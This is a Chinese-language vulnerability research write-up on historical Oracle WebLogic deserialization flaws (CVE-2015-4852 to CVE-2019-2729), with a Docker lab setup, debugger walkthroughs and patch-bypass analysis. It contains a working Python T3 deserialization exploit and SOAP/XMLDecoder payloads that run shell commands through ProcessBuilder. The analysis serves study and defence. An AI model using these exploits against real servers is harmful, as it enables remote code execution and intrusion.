### 环境搭建

链接：<https://github.com/QAX-A-Team/WeblogicEnvironment>

需要自行下载对应版本的 jdk 和 weblogic 放入对应文件夹中

![image-20220128180148642](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b7d261ff6117c483760c1d3c6c8a7d86d3c356d2.png)

docker设置及远程调试环境配置：

```php
  docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .

  docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```

访问 <http://localhost:7001/console/login/LoginForm.jsp> 出现登录页面

新建 middleware 作为用于调试的文件夹

```shell
  dir ./middleware

  docker cp weblogic1036jdk7u21:/weblogic/oracle/middleware/modules ./middleware/

  docker cp weblogic1036jdk7u21:/weblogic/oracle/middleware/wlserver ./middleware/

  docker cp weblogic1036jdk7u21:/weblogic/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib
```

然后用 IDEA 打开，导入 wlserver/server/lib （Add as Library)，之后设置远程调试端口为 8453。

打开 WLSServletAdapter 类，129 行下断点。

![image-20220128181650482](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-85348d6ab0a58ccee1686222d6c7d6d376471028.png)

访问 <http://localhost:7001/wls-wsat/CoordinatorPortType> ，若成功拦截，则环境配置完毕。

- ### CVE-2015-4852（T3 反序列化漏洞)
    
    关于 weblogic 漏洞所需的基础知识可参考这位dalao的文章 [https://paper.seebug.org/1012/#weblogic\_8](https://paper.seebug.org/1012/#weblogic_8).
    
    漏洞点在：weblogic.rjvm.InboundMsgAbbrev#readObject
    
    ![image-20220128182231676](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6cb955db54f15ba2cce5ac4f256649bd60bac438.png)
    
    t3协议的数据流会走这个类，关注 readObject 之后的操作，查看 ServerChannelInputStream 类中的具体方法。
    
    ![image-20220128182640326](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4ca8358b9a1bc7bbdb00f018f3a7bd23812d11b2.png)
    
    漂亮！resolveClass 中什么防御都无。其中resolveClass 是 readObject 底层流程要走的函数，shiro 反序列化中因为 shiro 框架对 resolveClass 进行了重写导致部分 CC 链打不了。在 weblogic 后续的补丁中也是对这个方法进行了修改。
    
    ![反序列化流程](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b51fe8ff31715581862ba2808ef64941f8c418cf.png)
    
    看一下 weblogic 自带的 CC 链
    
    ![image-20220128192910968](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5f427c5113075564e02f38ddb4625d3b63c18758.png)
    
    ##### poc:
    
    ```python
    from os import popen
    import struct # 负责大小端的转换 
    import subprocess
    from sys import stdout
    import socket
    import re
    import binascii
    
    def generatePayload(gadget,cmd):
      YSO_PATH = "D:/javaweb/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"
      popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
      return popen.stdout.read()
    
    def T3Exploit(ip,port,payload):
      sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      sock.connect((ip,port))
      handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
      sock.sendall(handshake.encode())
      data = sock.recv(1024)
      compile = re.compile("HELO:(.*).0.false")
      match = compile.findall(data.decode())
      if match:
          print("Weblogic: "+"".join(match))
      else:
          print("Not Weblogic")
          return  
      header = binascii.a2b_hex(b"00000000")
      t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
      desflag = binascii.a2b_hex(b"fe010000")
      payload = header + t3header  +desflag+  payload
      payload = struct.pack(">I",len(payload)) + payload[4:]
      sock.send(payload)
    if __name__ == "__main__":
      ip = "172.21.65.112"
      port = 7001
      gadget = "CommonsCollections1"
      cmd = "touch /tmp/CVE-2015-4852"
      payload = generatePayload(gadget,cmd)
      T3Exploit(ip,port,payload)
    ```
- ### CVE-2016-0638（CVE-2015-4852 修复后的绕过）
    
    在补丁 p21984589\_1036\_Generic 中，在 ServerChannelInputStream 的 resolveClass 中引入 ClassFilter.isBlackListed 进行过滤，但菜鸡的我没有找到补丁文件。。。这里放一张参考文献中dalao的图：
    
    ![CVE-2016-0638](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2523a7929d56052cd73dda209017e788845f5286.png)
    
    其实之后的 t3 反序列化就是变着花的绕黑名单了。
    
    补充信息：
    
    ```php
    在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。
    ```
    
    在这里需要找的就是其他类的反序列化方法，其中 weblogic.jms.common.StreamMessageImpl 没在黑名单中，在其中的 readExternal 方法中，new 了一个没有被黑名单过滤的对象，并执行了这个对象的 readObject，造成了二次反序列化。
    
    ![image-20220128203456310](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a2efe63fb4647f7f85d598bc0d4719a686455400.png)
    
    再关注一下这个 var4 是怎么来的
    
    ![image-20220128204628190](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e1370a3412f7533b6c7a16a4fcf8711c089afcc0.png)
    
    然后把流和一个int传入 copyPayloadFromStream 中
    
    ![image-20220128204928125](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1160a33720beeeb535404e1cecddf6193b7dade8.png)
    
    流进到了 createOneSharedChunk 中
    
    ![image-20220128205048336](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d649adb236b9ce280c950a3679bf934c038a34cb.png)
    
    创建了一个 chunk ，readExternal 的后续操作就是从中读取数据并进行了反序列化。
    
    这里使用工具 [https://github.com/5up3rc/weblogic\_cmd](https://github.com/5up3rc/weblogic_cmd) 进行分析。
    
    IDEA打开工具，配置执行环境，导入 tools 包（jdk/lib/tool.jar）中，然后打断点。
    
    ![image-20220128212411803](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5a31f31697cc3ec45f786b29a7d8983ae65cad58.png)
    
    ![image-20220128212359241](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0cf34439b4826b0397fe98b4685600b18e9257fc.png)
    
    ![image-20220128212506236](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5c5e2fb5ff714decf1a2768f4fdbe88e2e95f981.png)
    
    然后开始 debug，经过参数解析后进入 blindExecute
    
    ![image-20220128212721390](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-99b42c930804ce3e085dabdcc2c8e876361b964b.png)
    
    然后进入到 SerialDataGenerator.serialBlindDatas
    
    ![image-20220128212926023](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2eb13a6da51aaac62a81162f6afb42fb274137c0.png)
    
    分别跟踪这两个函数实现
    
    ![image-20220128212851091](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c9aaf1e311269b899a1191e6396304e9edfccaeb.png)
    
    ![image-20220128213028557](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4606e3e3a5c1aa8de194eccff750bda447a0142a.png)
    
    拼起来正好是一条 CC1。但没完，返回之前还要进入 BypassPayloadSelector.selectBypass ，这一方法用来处理原生链中本应该直接进行反序列化的对象（二次反序列化包装）。
    
    ![image-20220128213240527](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-cc9bd122f55d5207208b5cd70c372af82bb5666e.png)
    
    在 Serializables.serialize 中进行序列化
    
    ![image-20220128213713163](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4909b1e24d7ce2af78fa567f551865b7ccaa228e.png)
    
    然后调用到最终要反序列化的 StreamMessageImpl
    
    ![image-20220128213856949](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0cef20558e3b917d1025ef33eafe537604e36fa3.png)
    
    接着 send payload 的实现就和上文 CVE-2015-4852 的 poc 的实现差不多了，构造 t3 数据包然后发送。
    
    ![image-20220128214127708](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-abc10e2b40c32c9afbba46574e5d6c92de5589cc.png)
- ### CVE-2016-3510（CVE-2015-4852 的另一种绕过方式）
    
    这次选用的类是 weblogic.corba.utils.MarshalledObject，其中的 readResolve 会读取 objBytes 的值赋给新 new 的 ois，然后将其进行反序列化。
    
    ![image-20220128215439105](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-48263ab8cbc27a8dd44fedb165e7362ebb927c86.png)
    
    在 weblogic\_cmd 的 Main 函数中修改一下 TYPE ![image-20220128215849406](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-13a87e7c1260c0cd36bc0a75ff755d680989a5b8.png)
    
    在 selectBypass 的时候换了一个对象
    
    ![image-20220128220041915](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-630a39b64e6f0222e66b4e66c91ccc7431a817de.png)
    
    进入到 MarshalledObject ，之后进行正常的序列化。
    
    ![image-20220128220134158](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-91c7bc282240eba77e1874c7ef85bb72b9c7cc0d.png)
- ### CVE-2017-3248（利用JRMPClient进行带外rce）
    
    东西很多，挖个坑单独说。
- ### CVE-2017-3506（XMLDecoder反序列化）
    
    基础知识可参考 [https://paper.seebug.org/1012/#weblogic\_8，这里先写个demo跟一下XMLDecoder的过程](https://paper.seebug.org/1012/#weblogic_8%EF%BC%8C%E8%BF%99%E9%87%8C%E5%85%88%E5%86%99%E4%B8%AAdemo%E8%B7%9F%E4%B8%80%E4%B8%8BXMLDecoder%E7%9A%84%E8%BF%87%E7%A8%8B)。
    
    poc.xml
    
    ```xml
    <java>
      <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="1">
              <void index="0">
                  <string>calc</string>
              </void>
          </array>
          <void method="start"/>
      </object>
    </java>
    ```
    
    Main.java
    
    ```java
    import java.beans.XMLDecoder;
    import java.io.*;
    
    public class Main {
      public static void main(String[] args) throws IOException, InterruptedException {
          File file = new File("poc.xml的绝对路径");
          XMLDecoder xd = null;
          try {
              xd = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
          } catch (Exception e) {
              e.printStackTrace();
          }
          Object s2 = xd.readObject();
          xd.close();
    
      }
    }
    ```
    
    第 9 行下个断点，跟进 XMLDecoder 类，发现这里首先 new 了一个 DocumentHandler 对象
    
    ![image-20220129141322391](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a15549e2679c1a21a0e95971020d54e7cd98eb84.png)
    
    首先对各种标签的解析
    
    ![image-20220129141521113](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6f75a2ba7c0231be73e41db4c39fa16d76c45223.png)
    
    最后在 处调用 getValue ,得到类的实例。
    
    ![image-20220129162957211](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-522ea5026f02dd3fd770be8a9e2ead6dd8b93934.png)
    
    补上一张@ fnmsd给出的XMLDecoder解析xml的流程图解释整个调用过程
    
    ![xmlDecoder](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ff2e13ae518e682861d5996b01f384b9ab8ed2c8.png)
    
    然后就是追一下 weblogic 是在哪调用 XMLDecoder 的
    
    ##### poc:
    
    ```xml
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 172.21.65.112:7001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Length: 824
    Accept-Encoding: gzip, deflate
    SOAPAction:
    Accept: */*
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
    Connection: keep-alive
    Content-Type: text/xml
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java version="1.8.0_131" class="java.beans.XMLDecoder">
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
                <void index="2">
                  <string>touch /tmp/CVE-2017-3506</string>
                </void>
              </array>
            <void method="start"/></void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    
    ```
    
    断点下在 WorkContextTube#readHeaderOld 上，然后进入 receive 中
    
    ![image-20220129211439149](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-73cfbbc570825c641705474167a66c760db42881.png)
    
    持续跟进到 readUTF 中，发现反序列化操作
    
    ![image-20220129211731830](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c195e47eead72217cc3331f1a5e0a70ff5b0cd5e.png)
- ### CVE-2017-10271（CVE-2017-3506 绕过）
    
    先看一下官方的补丁
    
    ```java
    private void validate(InputStream is) {
        WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
        try {
           SAXParser parser = factory.newSAXParser();
           parser.parse(is, new DefaultHandler() {
              public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                 if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid context type: object");
                 }
              }
           });
        } catch (ParserConfigurationException var5) {
           throw new IllegalStateException("Parser Exception", var5);
        } catch (SAXException var6) {
           throw new IllegalStateException("Parser Exception", var6);
        } catch (IOException var7) {
           throw new IllegalStateException("Parser Exception", var7);
        }
     }
    ```
    
    重点就是这：
    
    ```java
    if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid context type: object");
    ```
    
    标签是 object 的时候报错，是不很理解为什么这么修，这里把 object 标签换成 void 标签照样可以执行命令。
    
    ```php
    <object class=”java.lang.ProcessBuilder”>    ====>
    <void class=”java.lang.ProcessBuilder”>
    ```
    
    ![image-20220129192508666](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8bf2713db57123a40655566fd62c9e52d78e6ca5.png)
    
    除了把 isArgument 从 true 变成 false 外全部继承 ObjectElementHandler。
- CVE-2019-2725（CVE-2017-10271绕过 + 新的反序列化组件）
    ------------------------------------------
    
    首先看新的 \_async 中存在的反序列化触发点（访问路径：/\_async/AsyncResponseService）
    
    从接收服务开始的完整解析过程详见https://www.anquanke.com/post/id/177381，这里只重点关注触发漏洞部分。
    
    请求从 BaseWSServlet 开始，断点下在 service 方法，一直跟进到 run
    
    ![image-20220129225207945](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9da6acd8872500cbdaced9740e91c0b30fa15f29.png)
    
    跟进到处理请求的部分，注意这里接收到的信息是以 Soap 协议解析的
    
    ![Soap](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-da49c90ef40d633fb6585497d6ea1bfc0b256ccb.png)
    
    ![image-20220129225645738](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-74f4cb118239a79928f23f98994feef06a346486.png)
    
    解析后的东西放在了 var7 中，然后跟一下 var7 的 invoke 方法
    
    ![image-20220129230059383](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b1e98da16db670fd60c9538a11c537704315fabb.png)
    
    在进行soap的初始化后进入 dispatch 中，跟进到 handleRequest 中
    
    ![image-20220129233730652](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7f4f3c59fb89e20613ad165c8fd76212a3c2e2ca.png)
    
    在 WorkContextXmlInputAdapter 中调用了 XMLDecoder
    
    ![image-20220129233753318](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a1ac9b3f11be54381303b51adf49bbe2d591de55.png)
    
    跟进 receiveRequest 方法中，发现调用了 readUTF ，剩下的流程接上前面分析的就可以了。
    
    ![image-20220129233906593](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a70c61449e976f6b14a77a172d1c34673e9b0d9f.png)
    
    关于补丁的绕过，先分析一下补丁代码：
    
    ```java
    private void validate(InputStream is) {
        WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
        try {
           SAXParser parser = factory.newSAXParser();
           parser.parse(is, new DefaultHandler() {
              private int overallarraylength = 0;
              public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                 if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid element qName:object");
                 } else if(qName.equalsIgnoreCase("new")) {
                    throw new IllegalStateException("Invalid element qName:new");
                 } else if(qName.equalsIgnoreCase("method")) {
                    throw new IllegalStateException("Invalid element qName:method");
                 } else {
                    if(qName.equalsIgnoreCase("void")) {
                       for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                           throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                          }
                       }
                    }
                     if(qName.equalsIgnoreCase("array")) {
                       String var9 = attributes.getValue("class");
                       if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                          throw new IllegalStateException("The value of class attribute is not valid for array element.");
                       }
    ```
    
    解释一下就是 ban 掉了object、new、method标签，如果使用void标签，只能有index属性，如果使用array标签，且标签使用的是class属性，则它的值只能是byte。
    
    那么我们需要找一个参数是 byte 类型的类尝试反序列化，这里采用的 jdk7u21的那条链。
    
    7u21 的命令执行部分是将 Templateslmpl 对象的 \_bytecodes 动态生成为对象，于是该类的static block和构造函数便会自动执行，造成命令执行。
    
    ##### poc (部分):
    
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class="byte" length="8970">
                  <void index="0">
                  <byte>-84</byte>
                  ...
                  ...
              </array></void></class>
              </java>
          </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    ```
- ### CVE-2019-2729 (CVE-2019-2725 绕过)
    
    具体挖掘细节可参考 <https://xz.aliyun.com/t/5448> ,这里给出最后结论.
    
    ##### poc:(jdk1.6可行)
    
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
      <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                  <array method="forName">
                      <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
                      <void>
                          <array class="byte" length="3748">
                              ...
                          </array>
                      </void>
                  </array>
              </java>
          </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    ```
    
    把 \\&lt;class&gt; 换成了 \\&lt;array method="forName"&gt;, 宏观上理解就是通过Class.forName(classname)来取到我们想要的类.
    
    在 jdk1.7 中, array 标签并不会受理 method 属性(没有意义), 但在 jdk1.6中的实现方法是:
    
    ```java
          } else if (var1 == "array") {
              var14 = (String)var3.get("class");
              Class var10 = var14 == null ? Object.class : this.classForName2(var14);
              var11 = (String)var3.get("length");
              if (var11 != null) {
                  var4.setTarget(Array.class);
                  var4.addArg(var10);
                  var4.addArg(new Integer(var11));
              }
    ```
    
    它将所有的标签属性进行统一处理，但是又没有进行有效性验证, 所以出现了绕过.
- ### 参考文献：
    
    
    - <http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/>
    - <https://www.cnblogs.com/nice0e3/p/14201884.html>
    - <https://www.cnblogs.com/nice0e3/p/14207435.html>
    - <https://xz.aliyun.com/t/8443>
    - <https://www.anquanke.com/post/id/250801>
    - <https://www.anquanke.com/post/id/251921>
    - <https://www.cnblogs.com/nice0e3/p/14269444.html>
    - <https://www.cnblogs.com/nice0e3/p/14275298.html>
    - <https://www.cnblogs.com/ph4nt0mer/p/11772709.html>
    - <https://www.anquanke.com/post/id/180725>
    - <https://www.anquanke.com/post/id/226575>
    - <https://www.anquanke.com/post/id/177381>
    - <https://xz.aliyun.com/t/5448>